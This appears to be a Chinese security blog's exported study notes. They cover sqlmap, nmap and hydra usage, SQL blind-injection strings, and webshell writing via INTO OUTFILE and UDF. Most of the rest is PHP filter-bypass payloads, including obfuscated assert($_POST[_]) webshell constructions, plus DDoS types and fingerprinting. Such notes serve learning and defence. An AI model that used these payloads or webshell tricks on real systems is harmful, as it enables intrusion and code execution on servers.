[{"title":"2020年2月04日学习笔记","url":"%2F2020%2F02%2F04%2F20200204%2F","content":"\n## SQLmap\n\n常用参数\n\n```\n-u 单个URL -m xx.txt 多个URL\n-d \"mysql://user:password@10.10.10.137:3306/dvwa\"  作为服务器客户端，直接连接数据库\n--data post/get都适用\n-p 指定扫描的参数\n-r 读取文件\n-f 指纹信息\n--tamper 混淆脚本，用于应用层过滤\n--cookie --user-agent --host等等http头的修改\n--threads 并发线程 默认为1\n--dbms MySQL<5.0> 指定数据库或版本\n\n–level=LEVEL 执行测试的等级（1-5，默认为 1）\n–risk=RISK 执行测试的风险（0-3，默认为 1） Risk升高可造成数据被篡改等风险\n–current-db / 获取当前数据库名称\n–dbs 枚举数据库管理系统数据库\n–tables 枚举 DBMS 数据库中的表\n–columns 枚举 DBMS 数据库表列\n-D DB 要进行枚举的数据库名\n-T TBL 要进行枚举的数据库表\n-C COL 要进行枚举的数据库列\n-U USER 用来进行枚举的数据库用户\n```\n\n\n\n## Nmap\n\n```\nnmap hostname/ip或者多个ip或者子网192.168.123.*\n-iL ip.txt 扫描ip.txt的所有ip\n-A 包含了-sV，-O，探测操作系统信息和路由跟踪。一般不用，是激烈扫描\n-O 探测操作系统信息\n-sV 查找主机服务版本号\n-sA 探测该主机是否使用了包过滤器或防火墙\n-sS 半开扫描，一般不会记入日志，不过需要root权限。\n-sT TCP connect()扫描，这种方式会在目标主机的日志中记录大批的链接请求以及错误信息。\n-sP ping扫描，加上这个参数会使用ping扫描，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping，却实际存在。\n-sN TCP空扫描\n-F 快速扫描\n-Pn 扫描之前不使用ping，适用于防火墙禁止ping，比较有用。\n-p 指定端口/端口范围\n-oN 将报告写入文件\n-v 详细信息\n-T<0-5> 设定速度\n```\n\nNmap还可以用到爆破等一些脚本\n\n```\n--script all 使用所有脚本\n--script=sql.injection.nse sql注入\n--script=\"smb*\"  扫smb系列\n```\n\n#### \n\n## Hydra\n\n密码爆破工具，FTP，MSSQL，MYSQL，POP3，SSH，rdp，\n\n```\nhydra IP -l loginname -P pass.txt PROTROCL\nhydra 127.0.0.1 -l root -P pass.txt ssh\n```\n\n\n\n## Mysql一个@和两个@什么区别\n\n- @为用户变量，使用`SET @var1=1`赋值\n\n- @@ 为系统变量 ，包括全局变量`show global variables \\G;`和会话变量`show session variables \\G;`\n\n  \n\n## 注入/绕过常用的函数\n\n1. 基于布尔SQL盲注\n   - `left(database(),1)>'s'`\n   - `ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 --+`\n   - `ascii(substr((select database()),1,1))=98`\n   - `ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))>98%23`\n   - `regexp`正则注入 `select user() regexp '^[a-z]';`\n   - `select user() like 'ro%'`\n2. 基于报错的SQL盲注\n   - `Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;`\n\n#### \n\n\n\n## MySQL存储过程\n\n#### 各种写shell的问题\n\n1. 写shell用什么函数？\n   - `select ' into outfile 'D:/shelltest.php'`\n   - `dumpfile`\n   - `file_put_contents`\n2. outfile不能用了怎么办？ `select unhex('udf.dll hex code') into dumpfile 'c:/mysql/mysql server 5.1/lib/plugin/xxoo.dll';`可以UDF提权 \n3. dumpfile和outfile有什么不一样？outfile适合导库，在行末尾会写入新行并转义，因此不能写入二进制可执行文件。\n4. sleep()能不能写shell？\n5. 写shell的条件？\n   - 用户权限\n   - 目录读写权限\n   - 防止命令执行：`disable_functions`，禁止了`disable_functions=phpinfo,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source`，但是可以用dl扩展执行命令或者ImageMagick漏洞 \n   - open_basedir: 将用户可操作的文件限制在某目录下\n\n\n\n\n\n## SpringMVC\n\n### spring加入配置\n\n<!-- controller注解扫描 -->\n\n<context:component-scan base-package=*\"cn.cnn.springboot.controller\"* />\n\n \n\n<!-- 注解驱动 -->\n\n<mvc:annotation-driven />\n\n-----------------------\n\n**site:域名 inurl:admin**  查找后台\n\n","tags":["安全"],"categories":["笔记"]},{"title":"2020年2月01日学习笔记","url":"%2F2020%2F02%2F01%2F20200201%2F","content":"\n## PHP\n\n### php中{}代替[]来取数组的元素\n\n```php\n<?php\necho $_GET{'asdf'};\n?>\n```\n\n\n\n### waf处理的是**_REQUEST**数组，然而数据处理的却是GET\n\n同一个变量名字，如果`variables_order`的顺序P在G后面，那么`$_POST['x']`会覆盖`$_GET['x']`\n\n```php\n<?php\nprint_r($_REQUEST['a']);\n?>\n    \n\\\\\nPOST /?a=get HTTP/1.1\nHost: 127.0.0.1\nContent-Length: 6\nContent-Type: application/x-www-form-urlencoded;charset=utf-8\n\na=post\n\n//\nArray\n(\n    [a] => post\n)\n```\n\n\n\n### GET数组键值特殊字符替换\n\nhttp://127.0.0.1?.*=abc\n\n```php\n<?php\nvar_dump($_GET['_*']);\nvar_dump($_GET['.*']);\n//发现.*被替换成了_*\n```\n\nPHP对于传入的非法的`$_GET`数组参数名，会将其转换成下划线\n\n非法字符开头或者只有一个非法字符的情况，会被转换成`_`的有：`.`。 非法字符在中间，或者非法字符结尾的情况，会被转换成`_`的有：`.`、`空格`、`+`、`[`。\n\n\n\n### 利用运算符\n\n```php\n<?php\nif(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {\n  eval($_GET['shell']);\n}\n```\n\n\n\n将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符\n\n```php\n<?php\n$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';\n$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';\n$___=$$__;\n$_($___[_]); // assert($_POST[_]);\n```\n\n利用UTF-8编码的某个汉字，并将其中某个字符取出来\n\n![img](./图片tmp/19-9-28_PHP_运算符_2.jpg)\n\n```php\n<?php\n$__=('>'>'<')+('>'>'<');//('>'>'<')+('>'>'<')==2\n$_=$__/$__;\n\n$____='';\n$___=\"瞰\";$____.=~($___{$_});$___=\"和\";$____.=~($___{$__});$___=\"和\";$____.=~($___{$__});$___=\"的\";$____.=~($___{$_});$___=\"半\";$____.=~($___{$_});$___=\"始\";$____.=~($___{$__});\n\n$_____='_';$___=\"俯\";$_____.=~($___{$__});$___=\"瞰\";$_____.=~($___{$__});$___=\"次\";$_____.=~($___{$_});$___=\"站\";$_____.=~($___{$_});\n\n$_=$$_____;\n$____($_[$__]);\n```\n\n### 递增／递减运算符\n\n```php\n<?php\n$_=[];\n$_=@\"$_\"; // $_='Array';\n$_=$_['!'=='@']; // $_=$_[0];\n$___=$_; // A\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n$___.=$__; // S\n$___.=$__; // S\n$__=$_;\n$__++;$__++;$__++;$__++; // E \n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R\n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$___.=$__;\n\n$____='_';\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$____.=$__;\n\n$_=$$____;\n$___($_[_]); // ASSERT($_POST[_]);\n```\n\n\n\n### 第二种过滤\n\n\n\n- 长度限制为`<=35`\n- 除了数字和字母，也不能包括`_`和`$`\n\n```php\n<?php\nif(isset($_GET['code'])){\n    $code = $_GET['code'];\n    if(strlen($code)>35){\n        die(\"Long.\");\n    }\n    if(preg_match(\"/[A-Za-z0-9_$]+/\",$code)){\n        die(\"NO.\");\n    }\n    eval($code);\n}else{\n    highlight_file(__FILE__);\n}\n```\n\n#### 取反\n\nPHP7前是不允许用`($a)();`这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过`('phpinfo')();`来执行函数，第一个括号中可以是任意PHP表达式。\n\n```php\n<?php\n(~urldecode('%8F%97%8F%96%91%99%90'))();\n?>\n```\n\n#### Shell\n\n1. shell下可以利用`.`来执行任意脚本\n2. Linux文件名支持用glob通配符代替\n\n利用Linux的通配符，`. xx`执行脚本的特性，以及PHP使用反引号执行命令的特点，得到如下：\n\n```php\n?><?=`. /???/????????[@-[]`;?>\n```\n\n**大写字母位于`@`与`[`之间,我们可以利用`[@-[]`来表示大写字母**\n\n**所有文件名都是小写，只有PHP生成的临时文件包含大写字母,php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。**\n\n**当发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是`/tmp/phpXXXXXX`，文件名最后6个字符是随机的大小写字母。**\n\n\n\n### 命名空间\n\n`\\phpinfo()也可以执行`\n\n```php\n<?php\n$action = $_GET['action'] ?? '';\n$arg = $_GET['arg'] ?? '';\n\nif(preg_match('/^[a-z0-9_]*$/isD', $action)) {\n    show_source(__FILE__);\n} else {\n    $action('', $arg);\n}\n```\n\n可以利用`create_function`函数注入。但以上代码变量$action必须包含`[a-z0-9_]`之外的字符，才会执行`$action('',$arg);`\n\n可以使用`%5c(\\)`绕过\n\n**原因：**\n\nphp里默认命名空间是\\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\\function_name() 这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。\n\n```php\n<?php\n\nnamespace test1{\n    function a(){\n        echo 'a';\n    }\n}\n\nnamespace test2{\n    function b(){\n        echo 'b';\n    }\n    function phpinfo(){\n        echo 'phpinfo changed';\n    }\n\n}\n\nnamespace{\n    \\test1\\a(); # a\n    \\test2\\b(); # b\n}\n```\n\n\n\n\n\n### 匿名函数\n\n一些函数如`call_user_func()`或`usort()`可以接受用户自定义的回调函数作为参数。回调函数不止可以是简单函数，还可以是对象的方法，包括静态类方法。\n\n闭包可以从父作用域中继承变量。 任何此类变量都应该用 use 语言结构传递进去。 `PHP7.1`起，不能传入此类变量：`superglobals`、`$this`或者和参数重名 \n\n```php\n<?php\n$message = 'hello';\n\n$example = function () {\n    var_dump($message);\n};\n#echo $example();  // Notice: Undefined variable: message \n\n$example = function () use ($message) {\n    var_dump($message);\n};\necho $example();  // string(5) \"hello\"\n\n\n$message = 'world'; \necho $example();   //string(5) \"hello\"\n\n$example = function ($arg) use ($message) {\n    var_dump($arg . ' ' . $message);\n};\n$example(\"hello\");   // string(11) \"hello world\"\n?>\n```\n\n\n\n### 回调函数\n\n- PHP是将函数以string形式传递的。\n- 可以使用任何内置或用户自定义函数，但除了语言结构例如：array()，echo，empty()，eval()，exit()，isset()，list()，print 或 unset()。\n- 一个已实例化的 object 的方法被作为 array 传递，下标 0 包含该 object，下标 1 包含方法名。 在同一个类里可以访问 protected 和 private 方法。\n- 静态类方法也可不经实例化该类的对象而传递，只要在下标 0 中包含类名而不是对象。自 PHP 5.2.3 起，也可以传递 'ClassName::methodName'。\n- 除了普通的用户自定义函数外，也可传递匿名函数给回调参数。\n\n```php\n<?php\n// An example callback function\nfunction my_callback_function() {\n    echo 'hello world!';\n}\n\ncall_user_func('my_callback_function'); \n\n# 结果\n// hello world!\n\n<?php\nclass MyClass {\n    static function myCallbackMethod() {\n        echo 'Hello World!';\n    }\n}\ncall_user_func(array('MyClass', 'myCallbackMethod')); \n\n// Hello World!\n\n<?php\nclass MyClass {\n    static function myCallbackMethod() {\n        echo 'Hello World!';\n    }\n}\n\ncall_user_func(array('MyClass', 'myCallbackMethod'));\n$obj = new MyClass();\ncall_user_func(array($obj, 'myCallbackMethod'));\n\n//Hello World!\n\n<?php\n\nclass A {\n    public static function who() {\n        echo \"A\\n\";\n    }\n}\n\nclass B extends A {\n    public static function who() {\n        echo \"B\\n\";\n    }\n}\n\ncall_user_func(array('B', 'parent::who')); // A\ncall_user_func(array('B', 'who')); // B\n\n\n\n<?php\n// Our closure\n$double = function($a) {\n    return $a * 2;\n};\n\n$numbers = range(1, 5);\n\n\n$new_numbers = array_map($double, $numbers);//将函数作用到数组中的每个值上，每个值都乘以本身，并返回带有新值的数组\n\nprint implode(' ', $new_numbers);\n// 2 4 6 8 10\n?>\n```\n\n#### `__invoke`魔术方法\n\n当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用\n\n```php\n<?php\n\nclass C {\n    public function __invoke($name) {\n        echo 'Hello ', $name, \"\\n\";\n    }\n}\n\n$c = new C();\ncall_user_func($c, 'PHP!');\n?>\n\n//Hello PHP!\n```\n\n\n\n\n\n### 无参函数可接受参数\n\n```php\n<?php\nfunction a(){\n    echo \"1\";\n}\na('1','2');\n//不报错\n```\n\n\n\n\n\n### 嵌套函数getshell,无参数函数的利用\n\n```php\n<?php\nif ($_POST['code']){\n    $code = $_POST['code'];\n    if (';' === preg_replace('/[a-z]+\\((?R)?\\)/', NULL, $code)) {\n        if (preg_match('/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', $code)) {\n            echo 'bye~';\n        } else {\n            eval($code);\n        }\n    }else{\n        echo \"No No No\";\n    }\n}\n?>\n    \n /*payload:\n echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));\n if(chdir(next(scandir(pos(localeconv())))))readfile(end(scandir(pos(localeconv()))));\n */\n\n```\n\n```\nscandir()   列出 images 目录中的文件和目录。//scandir()接受一个目录地址的参数，当传递为一个\".\"时，则会返回一个数组包含当前目录下的目录名和文件名。\nend()       将内部指针指向数组中的最后一个元素，并输出。\nreadfile()  输出一个文件\nlocaleconv()   函数返回一包含本地数字及货币格式信息的数组。\n\n----\narray(18) {\n  [\"decimal_point\"]=>\n  string(1) \".\"\n  [\"thousands_sep\"]=>\n  string(0) \"\"\n  [\"int_curr_symbol\"]=>\n  ....\n----\n\ncurrent()       返回数组中的当前单元, 默认取第一个值\npos()           current() 的别名\nreadfile(end(scandir(pos(localeconv()))));//获取到当前目录的最后一个文件\n\nchdir() 函数改变当前的目录。\nnext() 函数将内部指针指向数组中的下一个元素，并输出。 这里可以获取到scandir()返回的\"..\"\n将目录定义为上一目录：chdir(next(scandir(pos(localeconv()))))\n\nlocaltime() 函数返回本地时间。返回的类型为关联数组\n    关联数组的键名如下：\n\n    [tm_sec] - 秒数\n    [tm_min] - 分钟数\n    [tm_hour] - 小时\n    ...\nchr() 函数从指定的 ASCII 值返回字符。\n获取\".\"的payload：chr(pos(localtime()))\n当时间为某一分钟的46秒时, pos(localtime())返回46。46是\".\"的ASCII码值。所以payload就会返回\".\"\n```\n\n```php\n<?php\nif(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_POST['code'])) {    \n    eval($_POST['code']);\n}\n?>\n    //这里正则表达式和上面的区别在于这里还运行函数名称包含_等特殊字符\n    /*payload:\n    echo(array_rand(array_flip(getenv())));\n    */\n```\n\n```\ngetenv()        获取一个环境变量的值(在7.1之后可以不给予参数)\narray_rand()    函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。\narray_flip()    array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。\n\ngetallheaders()     获取全部 HTTP 请求头信息, 是下方函数的别名\napache_request_headers  获取全部 HTTP 请求头信息\n这两个函数只适用于apache服务器 \n可用于读取构造header注入\n----\narray(11) {\n  [\"Accept-Language\"]=>\n  string(23) \"zh-CN,zh;q=0.9,en;q=0.8\"\n  [\"Accept-Encoding\"]=>\n  string(17) \"gzip, deflate, br\"\n  [\"Accept\"]=>\n  string(3) \"*/*\"\n  [\"Content-Type\"]=>\n  string(68) \"multipart/form-data; boundary=----WebKitFormBoundaryevLOjNPCJPGbsCBf\"\n  ...\n}\n----\n\nget_defined_vars() 函数返回由所有已定义变量所组成的数组。\n----\narray(4) {\n  [\"_GET\"]=>\n  array(0) {\n  }\n  [\"_POST\"]=>\n  array(1) {\n    [\"code\"]=>\n    string(29) \"var_dump(get_defined_vars());\"\n  }\n  [\"_COOKIE\"]=>\n  array(0) {\n  }\n  [\"_FILES\"]=>\n  array(0) {\n  }\n}\n----//eval(end(current(get_defined_vars())));\n\n\nsession_id() 可以用来获取/设置 当前会话 ID。\nsession_start() 会创建新会话或者重用现有会话。 如果通过 GET 或者 POST 方式，或者使用 cookie 提交了会话 ID， 则会重用现有会话。\n//eval(hex2bin(session_id(session_start())));\n```\n\n#### 无参数函数小总结\n\n```\ngetchwd() 函数返回当前工作目录。\nscandir() 函数返回指定目录中的文件和目录的数组。\ndirname() 函数返回路径中的目录部分。\nchdir() 函数改变当前的目录。\n\nreadfile()  输出一个文件\n\ncurrent()       返回数组中的当前单元, 默认取第一个值\npos()           current() 的别名\nnext() 函数将内部指针指向数组中的下一个元素，并输出。\nend()       将内部指针指向数组中的最后一个元素，并输出。\narray_rand()    函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。\narray_flip()    array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。\n\nchr() 函数从指定的 ASCII 值返回字符。\nhex2bin — 转换十六进制字符串为二进制字符串\n\ngetenv()        获取一个环境变量的值(在7.1之后可以不给予参数)\n```\n\n\n\n### 函数漏洞\n\n#### getimagesize图片验证绕过\n\n```php\n<?php\nprint_r(getimagesize('png.php'));\nprint_r(getimagesize('gif.php'));\n```\n\n```python\nwith open('png.php','wb') as f:\n    f.write(b'\\x89PNG\\r\\n\\x1a\\n<?php phpinfo(); ?>')\nwith open('gif.php','wb') as f:\n    f.write(b'GIF89a<?php phpinfo(); ?>')\n```\n\n![img](./图片tmp/111.png)\n\n\n\n#### in_array\n\n```\nin_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : bool\n```\n\n只要第三个参数`$strict`**没有**设置成**TRUE**，就不会进行强检查。\n\n```php\n<?php\n$a=7;\n$b[]='7shell';\nvar_dump(in_array($a,$b));\nvar_dump(in_array($a,$b,$strict=true));\n```\n\n\n\n#### filter_var\n\n```\nfilter_var ( mixed $variable [, int $filter = FILTER_DEFAULT [, mixed $options ]] ) : mixed\n```\n\n```php\nfilter_var('javascript://comment%250Aalert(1)', FILTER_VALIDATE_URL);\n```\n\n上述代码可能会导致XSS攻击。\n\n因为`//`在JavaScript中表示单行注释，`%250a`解码后为换行符，所以`alert(1)`和`//`不在一行，js代码成功执行。\n\n```php\n<?php\n$url = filter_var($_GET['url'],FILTER_VALIDATE_URL);\nvar_dump($url);\n$url=htmlspecialchars($url);\nvar_dump($url);\necho \"<a href='$url'>Next slide </a>\";\n```\n\n\n\n#### strpos\n\n```\nstrpos ( string $haystack , mixed $needle [, int $offset = 0 ] ) : int\n```\n\n如果查询到的字符在第一位，那么返回为数字为0；而查询不到的结果也为false。\n0和false取反皆为true，如果不注意就有可能造成错误。\n\n```php\n<?php\nprint(strpos('baa','b'));\n# 0\n?>\n```\n\n\n\n#### parse_str\n\n```php\nparse_str ( string $encoded_string [, array &$result ] ) : void\n```\n\nparse_str的作用就是解析字符串并且注册成变量，但是在注册变量之前，他不会验证当前变量是否存在，所以会覆盖掉当前作用域中原有的变量。 ![img](https://j7ur8.github.io/WebBook/images/19-7-9_PHP_parse_str_1.png)\n\n```php\n<?php\n$j7ur8='best';\nparse_str('j7ur8=didi');\necho $j7ur8; \n# didi php<7.2\n# PHP Deprecated:  parse_str(): Calling parse_str() without the result argu\n```\n\n\n\n#### preg_replace\n\n```\npreg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] ) : mixed\n```\n\n$pattern 存在`/e`模式修正符，允许代码执行。\n\n```php\n<?php\nvar_dump(preg_replace('/(.*)/ie','strtolower(\"\\1\")','{${phpinfo()}}'));\n?>\n```\n\n以上代码能执行除了`preg_replace`的`/e`修饰符可以执行代码外，还一个原因是strtolower函数使用了`\"\"`。我们知道`\"\"`内部是可以引用变量的。如：\n\n```php\n<?php\n$a='asfd';\necho \"$a\";  #asf\n```\n\n\n\n#### create_function\n\n```php\ncreate_function ( string $args , string $code ) : string\n```\n\n```php\ncreate_function('$a', '}phpinfo();{'); # 执行phpifno()\ncreate_function('$a', '}phpinfo();/*');\n```\n\n因为create_function采用拼接的方法构造函数，所以上述过程可以想象成如下：\n\n```php\n源代码：\nfunction fT($a) {\n  echo \"test\".$a;\n}\n\n注入后代码：\nfunction fT($a) {\n  echo \"test\";}\n  phpinfo();/*;}\n\n*/  ### 这一行是为了关闭上一个注入代码的注释\n注入后的代码：\nfunction fT($a) {\n  echo \"test\";}\n  phpinfo();{;\n}\n```\n\n\n\n#### parse_url\n\n##### 错误的解析hostname\n\n#### 利用范围\n\n- PHP5.x < php5.6.28\n- PHP7.0 < php7.0.13\n\n```php\n<?php\necho parse_url(\"http://example.com:80#@google.com/\")[\"host\"].\"\\n\"; #google.com\necho parse_url(\"http://example.com:80?@google.com/\")[\"host\"].\"\\n\"; #google.com\necho file_get_contents(\"http://example.com:80#@google.com\");       # example.com \n?>\n```\n\n##### 不解析有端口但没有协议网址\n\n#### 利用范围\n\n- PHP5.6 < PHP5.6.8\n- PHP5.5 < PHP5.5.24\n- PHP5.4.x\n\n```php\n<?php\nprint_r(parse_url('//example.org:81/hi?a=b#c=d'));   // \nprint_r(parse_url('//example.org/hi?a=b#c=d'));   //Array([host] => example.org [path] => /hi [query] => a=b [fragment] => c=d )\n```\n\n\n\n##### 无法解析空用户名和密码\n\n- PHP5.6 < PHP5.6.3\n- PHP5.5 < PHP5.5.19\n- PHP5.4.x\n\n```php\n<?php\n// correct (returns empty username)\nvar_dump( parse_url( 'https://@example.com' ) );\n// incorrect (doesn't return empty username or password)\nvar_dump( parse_url( 'https://:@example.com' ) );\n// incorrect (doesn't return empty username)\nvar_dump( parse_url( 'https://:password@example.com' ) );\n// incorrect (doesn't return empty password)\nvar_dump( parse_url( 'https://username:@example.com' ) );\n```\n\n\n\n##### 对于//的解析错误\n\n- php5.x < php5.4.7\n\n```php\n<?php\nvar_dump(parse_url('//example.org'));  # array(1) {'path' => string(14) \"//example.org\"}\nvar_dump(parse_url('http:/xxx.com/abc//def?g=1&e=2'))['path'] // def?g=1&e=2\nvar_dump(parse_url('http:/xxx.com/abc///def?g=1&e=2'))['path'] // FALSE\n```","tags":["安全"],"categories":["笔记"]},{"title":"2020年1月29日学习笔记","url":"%2F2020%2F01%2F29%2F20200129%2F","content":"\n## DDos简介\n\n　　DDos又叫分布式拒绝服务，全称Distributed Denial of Service，利用DDos造成的攻击称为拒绝服务攻击，其原理就是利用大量的请求造成资源过载，导致服务不可用。\n　　DDos攻击从层次上可分为**网络层攻击**与**应用层攻击**，从攻击手法上可分为快型流量攻击与慢型流量攻击，但其原理都是造成资源过载，导致服务不可用。\n\n## 网络层DDos攻击\n\n网络层DDos攻击包括SYN flood、UDP flood、ICMP flood等\n\n### SYN flood攻击\n\n　　SYN flood攻击主要利用了TCP三次握手过程中的bug，我们知道TCP三次握手过程是要建立连接的双方发送SYN，SYN+ACK，ACK数据包，而当攻击方随意构造源ip去发送SYN包时，服务器返回的SYN+ACK就不能得到应答（因为ip是随意构造的），此时服务器就会尝试重新发送，并且会有至少30s的等待时间，导致资源饱和服务不可用，此攻击属于慢型dos攻击。\n\n### UDP flood攻击\n\n　　由于udp是一种无连接的协议，因此攻击者可以伪造大量的源IP地址去发送udp包，此种攻击属于大流量攻击。正常应用情况下，UDP包双向流量会基本相等，因此在消耗对方资源的时候也在消耗自己的资源。\n\n### ICMP flood攻击\n\n　　此攻击属于大流量攻击，其原理就是不断发送不正常的ICMP包（所谓不正常就是ICMP包内容很大），导致目标带宽被占用，但其本身资源也会被消耗。并且目前很多服务器都是禁ping的（在防火墙在可以屏蔽icmp包），因此这种方式已经落伍。\n\n### 网络层DDos防御\n\n- 网络架构上做好优化，采用负载均衡分流。\n- 添加抗DDos设备，流量清洗。\n- 限制单ip请求频率。\n- 防火墙等防护设置禁止icmp包等\n\n## 应用层DDos攻击\n\n应用层DDos攻击不是发生在网络层，是发生在TCP建立握手成功之后，应用程序处理请求的时候。\n\n### CC攻击\n\n　　CC攻击的原理，就是针对消耗资源比较大的页面不断发起不正常的请求，导致资源耗尽。因此在发送CC攻击前，我们需要寻找加载比较慢，消耗资源比较多的网页，比如需要查询数据库的页面、读写硬盘文件的等。通过cc攻击，使用爬虫对某些加载需要消耗大量资源的页面发起http请求。\n\n### slowloris\n\n　　这是由于webserver中间件漏洞引发的拒绝服务攻击，其原理是以极低的速度往服务器发送HTTP请求。apache等中间件默认会设置最大并发链接数，而这种攻击就是会持续保持连接，导致服务饱和不可用。slowloris有点类似基于HTTP协议的SYN flood攻击。\n\n构造以下畸形http请求包\n\n```html\nGET / HTTP/1.1\\r\\n\nHost: Victim host\\r\\n\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\\r\\n\nContent-Length: 42\\r\\n\n```\n\n完整的http请求头结尾应该是两次的\\r\\n\\r\\n，这里少了一次，因此服务器将会一直等待。\n\n### HTTP POST DOS\n\n　　其原理是在发送HTTP POST包时，指定一个非常大的Content-Length值，然后以极低的速度发包，保持连接不断，导致服务饱和不可用。\n\n### Slow Read attack\n\n　　Slow Read attack攻击方式是采用调整TCP协议中的滑动窗口大小，来对服务器单次发送发送的数据大小进行控制，使得服务器需要对一个回应分成很多个包来发送。\n\n### Server Limit Dos\n\n　　这是由于cookie导致的dos攻击，当然其原理还是基于webserver的特性。apache默认最大的http包头长度为8192字节，如果超出此长度，则会返回4xx错误。如果我们利用存储型xss漏洞，将一个超长的cookie写入客户端页面，则用户再访问此页面后，由于请求头加载了恶意的超长cookie，导致其不能访问该站的页面（除非清空cookie）\n\n### ReDos\n\n　　这是由于代码写得有缺陷，导致使用正则时，会出现大量占用资源的情况，导致服务不可用，这是利用了正则表达式在匹配时的某些特性决定的。\n\n### 应用层DDos防御\n\n- 判断User-Agent字段（不可靠，因为可以随意构造）\n- 网页中镶嵌js代码（不可靠，因为爬虫也可携带浏览器引擎，或者执行js代码）\n- 针对ip+cookie，限制访问频率（由于cookie可以更改，ip可以使用代理，或者肉鸡，也不可靠)\n- 关闭apache最大连接数等，合理配置中间件，缓解ddos攻击。\n- 页面中添加验证码，比如搜索数据库时。\n- 编写代码时，尽量实现优化，并合理使用缓存技术，减少数据库的读取操作。","tags":["安全"],"categories":["笔记"]},{"title":"2020年1月15日学习笔记","url":"%2F2020%2F01%2F15%2F20200115%2F","content":"\n\n## 系统识别\n\n### p0f\n\np0f采用被动式的方法探测目标主机的操作系统类型。这个工具可以识别一下几种主机：\n\n- 连接到您主机的机器（SYN模式、即默认模式）\n- 您主机可以访问的机器（SYN+ACK模式）\n- 您主机不能访问的机器（RST+模式）\n- 您可以监控到期网络通信的机器\n\n这个程序通过自身发出的TCP数据包分析操作系统的类型。然后，它会统计在默认情况下不会产生的非标准数据包。例如，Linux内核操作系统默认使用64字节的ping数据包，而Windows操作系统则使用32字节的ping数据包。这两个操作系统在TTL值上同样存在差异。Windows发出的数据包，其TTL值是128；而不同版本的Linux操作系统，其数据包的TTL值各有所不同。p0f程序正是根据这些细微的差别识别远程主机的操作系统。\n\n\n### Nmap\n\nNmap是一款非常受欢迎的功能强大的端口扫描程序。它还能够识别操作系统的操作系统，能够进行主动式的操作系统指纹识别。如需使用操作系统识别功能，只需要在Namp选项中加入“-O”即可！\n\n\n\n### banner抓取\n\nBanner抓取是最基础，最简单的指纹识别，不需要专门的工具就可以做，操作简单，通常获取的信息也相对准确，banner抓取是应用程序指纹识别而不是操作系统指纹识别。\n\n\n\n\n\n## 端口扫描\n\n**常用到的协议对应的端口**\n\n- TCP 21端口：FTP 文件传输服务\n\n- TCP 23端口：TELNET 终端仿真服务\n\n- TCP 25端口：SMTP 简单邮件传输服务\n\n- UDP 53端口：DNS 域名解析服务\n\n- TCP 80端口：HTTP 超文本传输服务\n\n- TCP 110端口：POP3 “邮局协议版本3”使用的端口\n\n- TCP 443端口：HTTPS 加密的超文本传输服务\n\n- TCP 1521端口：Oracle数据库服务\n\n- TCP 1863端口：MSN Messenger的文件传输功能所使用的端口\n\n- TCP 3306端口：Mysql数据库\n\n- TCP 3389端口：Microsoft RDP 微软远程桌面使用的端口\n\n- TCP 5631端口：Symantec pcAnywhere 远程控制数据传输时使用的端口\n\n- UDP 5632端口：Symantec pcAnywhere 主控端扫描被控端时使用的端口\n\n- TCP 5000端口：MS SQL Server使用的端口\n\n- UDP 8000端口：腾讯QQ\n\n### Nmap端口扫描\n\nNmap是被专业人员广泛使用的一款功能全面的端口扫描工具。\n\n处理端口扫描外，Nmap还具备以下功能：\n\n- 主机探测\n- 